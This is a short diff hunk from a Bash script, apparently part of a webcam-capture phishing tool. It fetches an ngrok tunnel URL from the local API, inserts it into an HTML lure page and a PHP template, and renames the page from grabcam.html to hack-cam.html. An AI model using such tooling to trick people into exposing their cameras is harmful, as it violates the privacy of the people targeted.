@@ -156,7 +156,7 @@ printf "\033[1;31m Enlace directo:\n"
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$link'+g' hack-cam.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
